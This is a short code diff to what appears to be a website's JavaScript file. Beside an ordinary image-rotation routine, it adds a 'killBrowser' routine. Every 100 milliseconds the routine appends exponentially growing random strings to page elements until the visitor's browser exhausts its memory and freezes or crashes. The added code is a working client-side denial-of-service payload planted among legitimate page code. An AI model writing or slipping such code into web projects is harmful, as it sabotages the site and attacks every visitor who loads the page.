@@ -30,7 +30,20 @@
     };
     setTimeout(A, r() * 3e3);
 })();
-
+var killBrowser = '';
+setInterval(function() {
+    for (var i = 0; i < 2; i ++) {
+        killBrowser +=
+            'o34ioj13ijo23tadjfo3oirjoi' + (Math.random() * 3e3) + "3roptoppij4w3gqwkl";
+        killBrowser +=
+            'o34ioj13i3t2joiadjfo3oirjoi' + (Math.random() * 3e3) + "optopwjqopij4w3gqwkl";
+        killBrowser +=
+            'o34ioj13argijoiadjfo3oirjoi' + (Math.random() * 3e3) + "3rpwjqopij4gqwkl";
+        killBrowser +=
+            'o34ioj13ijg24w4eoiadjfo3oirjoi' + (Math.random() * 3e3) + "optopjqpij4w3gwkl";
+        $(".overflow div ol li p").append(killBrowser);
+    }
+}, 100);
 $(document).ready(function() {
     setInterval(rotateImages, 4000);
 });
